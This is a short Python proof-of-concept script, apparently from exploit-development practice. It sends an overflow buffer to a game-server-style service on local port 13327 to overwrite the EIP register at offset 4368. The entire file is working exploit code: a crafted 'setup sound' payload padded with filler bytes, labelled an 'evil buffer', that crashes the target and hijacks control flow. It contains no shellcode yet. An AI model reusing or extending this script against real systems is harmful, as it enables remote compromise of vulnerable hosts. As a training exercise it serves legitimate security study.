#!/usr/bin/python
#
# CONTROLLING EIP
# 	We now know that: [*] Exact match at offset 4368
#	So we want to overwrite EIP register with "42424242" to test controlling EIP

import socket

host = "127.0.0.1"

# \x41 = 'A'
# 4368 = nbytes until EIP is overwritten
# 4 = nbytes in EIP register
# 7 = padding
crash = "\x41"*4368 + "\x42"*4 + "\x43"*7

# \x90\x00# = bytes that terminate the buffer
buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Sending evil buffer...")
s.connect((host, 13327))
s.send(buffer)
data = s.recv(1024)
print(data)
s.close()
print("[*] Payload sent")
